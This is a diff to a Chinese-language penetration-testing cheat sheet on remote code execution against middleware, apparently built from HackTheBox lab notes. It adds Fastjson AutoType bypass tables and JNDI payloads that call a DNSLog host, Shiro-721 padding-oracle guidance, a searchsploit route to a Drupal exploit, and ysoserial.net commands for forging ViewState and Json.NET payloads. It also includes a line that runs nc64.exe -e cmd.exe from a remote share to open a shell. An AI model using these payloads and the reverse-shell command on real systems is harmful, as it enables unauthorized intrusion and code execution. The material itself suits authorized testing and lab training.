@@ -125,7 +125,16 @@ DNSLog 收到记录 = 命中；**只用 DNS 外带证明触发，不用 LDAP gad
 {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://xxx.dnslog.cn/a","autoCommit":true}
 ```
 
-DNSLog 收到 = 至少解析了 `@type`；版本链：`<1.2.25` 直接利用（CVE-2017-18349）、`1.2.25–1.2.47` 缓存绕过（CVE-2019-12384）、`1.2.68+` expectClass 绕过。1.2.47 绕过链：
+DNSLog 收到 = 至少解析了 `@type`；版本→绕过链演进（前两行原有，其余按版本选 payload 的补充，来源：中间件及其漏洞）：
+
+| 版本 | 绕过 |
+|---|---|
+| `≤1.2.24` | 无 AutoType 限制，直接利用（CVE-2017-18349） |
+| `1.2.25–1.2.41` | 黑名单；**类名前加 `L`、末尾加 `;`** 绕过前缀检测 |
+| `1.2.42` | 前缀检测改 hash 判断 → **`LL...;;` 双写** |
+| `1.2.25–1.2.47` | `java.lang.Class` 缓存绕过（CVE-2019-12384，下链） |
+| `1.2.68` | safeMode 半开关 → **expectClass** 绕过 |
+| `1.2.80` | 修复 expectClass → **异常类链**绕过 |
 
 ```json
 {"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},
@@ -140,6 +149,8 @@ DNSLog 收到 = 至少解析了 `@type`；版本链：`<1.2.25` 直接利用（C
 java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser
 curl -H "Cookie: rememberMe=<AES加密后的base64>" http://target
 ```
+
+**Shiro-721（CVE-2019-12422，默认密钥打不动时的备选）**：无需知道密钥——利用 AES-CBC Padding Oracle（rememberMe 解密失败 500 / 成功 200 的响应差分）逐字节推算合法密文，影响 <1.4.2。价值：密钥爆破失败 ≠ 死路，721 仍可打（来源：中间件及其漏洞）。
 
 **Struts2（OGNL）** `[本地 src-hunter 00-index.md §3.7/§6.4 / 10-framework.md]`
 
@@ -183,6 +194,8 @@ curl -X POST http://target:8080/functionRouter \
 
 T3 探测：`echo "t3 12.2.1" | nc target 7001`，返回 `HELO` 即存在 T3 服务。XMLDecoder 核心（`<void class="java.lang.ProcessBuilder">` + `<array class="java.lang.String">` + `<void method="start"/>`），完整 SOAP 包见 10-framework.md。
 
+**Drupal（历史 RCE，CMS 指纹确认后）** `[本地 Windows/Linux 提权专区 Bastard 段]`：CHANGELOG.txt 定版本 → 命中范围（Drupal <7.58 / <8.3.9，CVE-2018-7600 演化族）→ `searchsploit drupal` 取 exp 副本（**用 searchsploit/exploitdb 副本，不用 github 随手下载的 exp——实测会崩靶机**）→ `searchsploit -m 44449` 后 `ruby 44449.rb http://target`。
+
 ### 4.5 反序列化
 
 **Java（ysoserial）** `[本地 src-hunter 00-index.md §3.4 / 12-deserialization.md / Claude-BugHunter hunt-deserialization]`
@@ -222,6 +235,23 @@ print(base64.b64encode(pickle.dumps(Exp())))
 **Ruby / .NET** `[本地 src-hunter 00-index.md / Claude-BugHunter]`
 
 Ruby `Marshal.load()` 接 cookie/参数（Gadget：`Gem::Installer`/`Gem::Requirement`）。.NET 用 ysoserial.net：`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc"`；未加密 ViewState（`__VIEWSTATEENCRYPTED=""`）+ 泄露 machineKey → `TypeConfuseDelegate` 链 RCE。
+
+**.NET 反序列化实操补充**（来源：反序列化 ysoserial.net 篇 / HTB-Pov / HTB-Json）：
+
+- **ysoserial.net 参数语义**：`-c` 命令、`-o` 输出格式（base64）、`-g` gadget（`ObjectDataProvider`/`TextFormattingRunProperties`/`WindowsIdentity`）、`-f` 序列化框架（`Json.Net` 等格式化器）。验证存在（无回显用 ping 计数+kali tshark 抓 ICMP）：
+
+```bash
+.\ysoserial.exe -c "ping -n 10 10.10.16.155" -o base64 -g ObjectDataProvider -f Json.Net
+```
+
+- **Json.NET 定位法**：报错含 `Cannot deserialize Json.Net Object` 类字样即 Json.NET 反序列化入口（HTB-Json）。
+- **ViewState 生成全参数**（path/apppath 与两种 key 都参与密钥派生，缺一签不出合法 ViewState；HTB-Pov，前置：LFI 读 web.config 拿 machineKey）：
+
+```bash
+.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping -n 5 10.10.16.58" --path="/portfolio/default.aspx" --apppath="/portfolio" --decryptionalg="AES" --decryptionkey="<web.config>" --validationalg="SHA1" --validationkey="<web.config>"
+```
+
+- **`START /B`**：Windows 不弹窗后台执行，测试期静默验证（`START /B \\IP\share\nc64.exe ... -e cmd.exe`）。
 
 ### 4.6 文件上传 → RCE 链 `[本地 src-hunter 13-file-rce-chain.md / Claude-Red offensive-rce]`
 
